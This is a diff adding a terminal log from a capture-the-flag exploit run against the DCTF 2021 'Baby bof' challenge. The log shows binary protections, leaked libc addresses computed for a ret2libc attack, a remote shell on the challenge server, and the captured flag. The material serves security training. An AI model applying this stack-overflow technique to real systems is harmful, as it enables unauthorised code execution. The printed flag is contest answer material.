@@ -1,0 +1,30 @@
+mito@ubuntu:~/CTF/DCTF_2021/Pwn_Baby_bof_250$ python3 solve.py r
+[*] '/home/mito/CTF/DCTF_2021/Pwn_Baby_bof_250/baby_bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done
+[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7f477b23d5a0
+libc_base   = 0x7f477b1b6000
+system_addr = 0x7f477b20b410
+binsh_addr  = 0x7f477b36d5aa
+[*] Switching to interactive mode
+
+i don't think this will work
+$ id
+uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
+$ ls -l
+total 20
+-rwxr-xr-x 1 pilot pilot 8408 May 14 00:49 baby_bof
+-rw-r--r-- 1 root  root    39 May 14 00:49 flag.txt
+-rw-r--r-- 1 root  root   201 May 14 00:49 startService.sh
+$ cat flag.txt
+dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}
